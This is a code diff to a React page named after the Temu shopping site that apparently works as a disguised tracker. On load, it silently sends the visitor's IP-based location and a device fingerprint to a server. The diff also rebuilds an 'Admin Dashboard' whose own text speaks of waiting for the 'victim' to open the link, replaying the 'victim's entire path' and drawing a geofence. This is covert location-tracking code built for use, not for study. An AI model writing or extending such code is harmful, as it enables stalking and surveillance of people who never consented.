@@ -71,15 +71,42 @@ export default function DynamicTemuPage() {
     const [isReplaying, setIsReplaying] = useState(false);
     const [replayIndex, setReplayIndex] = useState(0);
     const watchIdRef = useRef(null);
+    const hasSentIPRef = useRef(false);
 
     // --- Effects & Callbacks ---
 
     // Temu Background Info
     useEffect(() => {
+        let mounted = true;
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
-            .then(data => setApproxLocation(`${data.city}, ${data.country_name}`))
-            .catch(() => setApproxLocation('Slovakia (Global)'));
+            .then(data => {
+                if (!mounted) return;
+                setApproxLocation(`${data.city}, ${data.country_name}`);
+
+                // Send initial fallback point
+                if (!isViewerMode && token && data.latitude && data.longitude && !hasSentIPRef.current) {
+                    hasSentIPRef.current = true;
+                    axios.post('/api/location', {
+                        token,
+                        lat: data.latitude,
+                        lng: data.longitude,
+                        accuracy: 10000, // Denotes IP-based approx accuracy
+                        deviceInfo: {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screen: `${window.screen.width}x${window.screen.height}`
+                        }
+                    }).catch(err => {
+                        hasSentIPRef.current = false;
+                        console.error('Failed to send initial IP location', err);
+                    });
+                }
+            })
+            .catch(() => {
+                if (mounted) setApproxLocation('Slovakia (Global)');
+            });
 
         const clockInterval = setInterval(() => {
             const now = new Date();
@@ -95,11 +122,12 @@ export default function DynamicTemuPage() {
         }, 800);
 
         return () => {
+            mounted = false;
             clearInterval(clockInterval);
             clearInterval(feedInterval);
             clearTimeout(locationTimer);
         };
-    }, [isViewerMode]);
+    }, [isViewerMode, token]);
 
     // Battery API
     useEffect(() => {
@@ -166,7 +194,11 @@ export default function DynamicTemuPage() {
                 const response = await axios.get(`/api/session/${token}`);
                 if (!active || !response?.data?.session) return;
                 const sessionPoints = response.data.session.points || [];
-                setTrackPoints(sessionPoints.map((point) => ({ lat: point.lat, lng: point.lng })));
+                setTrackPoints(sessionPoints.map((point) => ({ 
+                    lat: point.lat, 
+                    lng: point.lng,
+                    accuracy: point.accuracy
+                })));
                 if (sessionPoints.length > 0) {
                     const last = sessionPoints[sessionPoints.length - 1];
                     setLocation({ lat: last.lat, lng: last.lng });
@@ -246,44 +278,108 @@ export default function DynamicTemuPage() {
     const displayPoint = isReplaying && trackPoints[replayIndex] ? trackPoints[replayIndex] : location;
 
     if (isViewerMode) {
+        // Find the last point with actual GPS accuracy vs the initial IP low-accuracy point
+        const latestPoint = trackPoints.length > 0 ? trackPoints[trackPoints.length - 1] : null;
+        const initialPoint = trackPoints.length > 0 ? trackPoints[0] : null;
+
         return (
-            <main style={{ padding: '1rem', fontFamily: 'Arial, sans-serif', maxWidth: '800px', margin: '0 auto' }}>
+            <main style={{ padding: '2rem 1rem', fontFamily: 'Inter, system-ui, Arial, sans-serif', maxWidth: '1000px', margin: '0 auto', background: '#f8fafc', minHeight: '100vh' }}>
                 <Head>
-                    <title>Admin Viewer - {token}</title>
+                    <title>Admin Dashboard - Tracker</title>
                 </Head>
-                <Script
-                    src={`https://maps.googleapis.com/maps/api/js?key=${process.env.NEXT_PUBLIC_GOOGLE_MAPS_API_KEY}&libraries=places`}
-                />
-                <h1>Live Location Viewer</h1>
-                <p>Status: {status}</p>
+                <Script src={`https://maps.googleapis.com/maps/api/js?key=${process.env.NEXT_PUBLIC_GOOGLE_MAPS_API_KEY}&libraries=places`} />
 
-                <div style={{ marginBottom: 12, background: '#f1f5f9', padding: 10 }}>
-                    <strong>Session Token: {token}</strong>
-                </div>
-
-                {displayPoint ? (
-                    <div style={mapContainerStyle}>
-                        <LeafletMap
-                            center={displayPoint}
-                            zoom={17}
-                            trackPoints={trackPoints}
-                        />
+                <div style={{ background: '#fff', borderRadius: '16px', padding: '24px', boxShadow: '0 4px 24px rgba(0,0,0,0.06)', marginBottom: '24px' }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
+                        <div>
+                            <h1 style={{ margin: '0 0 8px 0', fontSize: '24px', color: '#0f172a' }}>Real-time Tracker Dashboard</h1>
+                            <p style={{ margin: 0, color: '#64748b', fontSize: '14px' }}>Token: <span style={{ fontFamily: 'monospace', background: '#f1f5f9', padding: '2px 6px', borderRadius: '4px' }}>{token}</span></p>
+                        </div>
+                        <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', background: status.includes('live') ? '#ecfdf5' : '#fef2f2', color: status.includes('live') ? '#059669' : '#dc2626', padding: '8px 16px', borderRadius: '20px', fontSize: '14px', fontWeight: '500' }}>
+                            <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: status.includes('live') ? '#10b981' : '#ef4444', border: '2px solid rgba(255,255,255,0.8)' }}></div>
+                            {status}
+                        </div>
                     </div>
-                ) : (
-                    <p>Wait for the victim to open the link and allow location...</p>
-                )}
-
-                <div style={{ marginTop: 12, background: '#eef6ff', padding: 10 }}>
-                    <strong>Stats</strong>
-                    <div>Points captured: {trackPoints.length}</div>
-                    <div>Distance: {(distanceMeters / 1000).toFixed(3)} km</div>
                 </div>
 
-                <div style={{ marginTop: 12, background: '#f8fafc', padding: 10 }}>
-                    <strong>Replay</strong>
-                    <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
-                        <button onClick={() => { setReplayIndex(0); setIsReplaying(true); }} disabled={trackPoints.length < 2}>Play</button>
-                        <button onClick={() => setIsReplaying(false)}>Pause</button>
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '16px', marginBottom: '24px' }}>
+                    <div style={{ background: '#fff', padding: '20px', borderRadius: '12px', boxShadow: '0 2px 12px rgba(0,0,0,0.04)', borderLeft: '4px solid #3b82f6' }}>
+                        <div style={{ fontSize: '13px', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.05em', fontWeight: '600', marginBottom: '8px' }}>Pings Recorded</div>
+                        <div style={{ fontSize: '28px', fontWeight: '700', color: '#0f172a' }}>{trackPoints.length}</div>
+                    </div>
+                    <div style={{ background: '#fff', padding: '20px', borderRadius: '12px', boxShadow: '0 2px 12px rgba(0,0,0,0.04)', borderLeft: '4px solid #10b981' }}>
+                        <div style={{ fontSize: '13px', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.05em', fontWeight: '600', marginBottom: '8px' }}>Total Distance</div>
+                        <div style={{ fontSize: '28px', fontWeight: '700', color: '#0f172a' }}>{(distanceMeters / 1000).toFixed(2)} <span style={{ fontSize: '16px', color: '#64748b', fontWeight: '500' }}>km</span></div>
+                    </div>
+                    <div style={{ background: '#fff', padding: '20px', borderRadius: '12px', boxShadow: '0 2px 12px rgba(0,0,0,0.04)', borderLeft: '4px solid #f59e0b' }}>
+                        <div style={{ fontSize: '13px', color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.05em', fontWeight: '600', marginBottom: '8px' }}>Current Accuracy</div>
+                        <div style={{ fontSize: '28px', fontWeight: '700', color: '#0f172a' }}>
+                            {latestPoint ? (latestPoint.accuracy > 5000 ? 'IP Only' : `~${Math.round(latestPoint.accuracy || 15)}m`) : '---'}
+                        </div>
+                    </div>
+                </div>
+
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '24px', marginBottom: '24px' }}>
+                    <div style={{ background: '#fff', borderRadius: '16px', padding: '4px', boxShadow: '0 4px 24px rgba(0,0,0,0.06)', overflow: 'hidden' }}>
+                        {displayPoint ? (
+                            <div style={{ width: '100%', height: '55vh', borderRadius: '12px', overflow: 'hidden' }}>
+                                <LeafletMap
+                                    center={displayPoint}
+                                    zoom={displayPoint.accuracy > 5000 ? 10 : 17}
+                                    trackPoints={trackPoints}
+                                    geofenceEnabled={geofenceEnabled}
+                                    geofenceCenter={initialPoint}
+                                    geofenceRadius={geofenceRadius}
+                                />
+                            </div>
+                        ) : (
+                            <div style={{ height: '55vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#f1f5f9', borderRadius: '12px', color: '#64748b', flexDirection: 'column', gap: '16px' }}>
+                                <div style={{ width: '40px', height: '40px', border: '3px solid #cbd5e1', borderTopColor: '#3b82f6', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
+                                <span>Waiting for victim to open link or IP location...</span>
+                            </div>
+                        )}
+                    </div>
+                </div>
+
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '16px' }}>
+                    <div style={{ background: '#fff', padding: '24px', borderRadius: '16px', boxShadow: '0 2px 12px rgba(0,0,0,0.04)' }}>
+                        <h3 style={{ margin: '0 0 16px 0', fontSize: '16px', color: '#0f172a' }}>Geofence Control</h3>
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
+                            <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', userSelect: 'none' }}>
+                                <input type="checkbox" checked={geofenceEnabled} onChange={e => setGeofenceEnabled(e.target.checked)} style={{ width: '18px', height: '18px', accentColor: '#3b82f6' }} />
+                                <span style={{ color: '#334155', fontWeight: '500' }}>Show Geofence on Initial Point</span>
+                            </label>
+                        </div>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                            <label style={{ color: '#64748b', fontSize: '14px' }}>Radius (meters)</label>
+                            <input
+                                type="range" min="10" max="2000" step="10" value={geofenceRadius}
+                                onChange={e => setGeofenceRadius(Number(e.target.value))}
+                                style={{ width: '100%', accentColor: '#3b82f6' }}
+                            />
+                            <div style={{ textAlign: 'right', fontWeight: '600', color: '#3b82f6' }}>{geofenceRadius} m</div>
+                        </div>
+                    </div>
+
+                    <div style={{ background: '#fff', padding: '24px', borderRadius: '16px', boxShadow: '0 2px 12px rgba(0,0,0,0.04)' }}>
+                        <h3 style={{ margin: '0 0 16px 0', fontSize: '16px', color: '#0f172a' }}>Session Replay</h3>
+                        <p style={{ color: '#64748b', fontSize: '14px', margin: '0 0 16px 0' }}>Simulate the victim's entire path from start to finish.</p>
+                        <div style={{ display: 'flex', gap: '12px' }}>
+                            <button
+                                onClick={() => { setReplayIndex(0); setIsReplaying(true); }}
+                                disabled={trackPoints.length < 2 || isReplaying}
+                                style={{ flex: 1, padding: '12px', background: trackPoints.length < 2 ? '#e2e8f0' : '#3b82f6', color: trackPoints.length < 2 ? '#94a3b8' : '#fff', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: trackPoints.length < 2 ? 'not-allowed' : 'pointer', transition: '0.2s' }}
+                            >
+                                Play Route
+                            </button>
+                            <button
+                                onClick={() => setIsReplaying(false)}
+                                disabled={!isReplaying}
+                                style={{ flex: 1, padding: '12px', background: '#f1f5f9', color: '#475569', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: !isReplaying ? 'not-allowed' : 'pointer' }}
+                            >
+                                Pause
+                            </button>
+                        </div>
                     </div>
                 </div>
             </main>
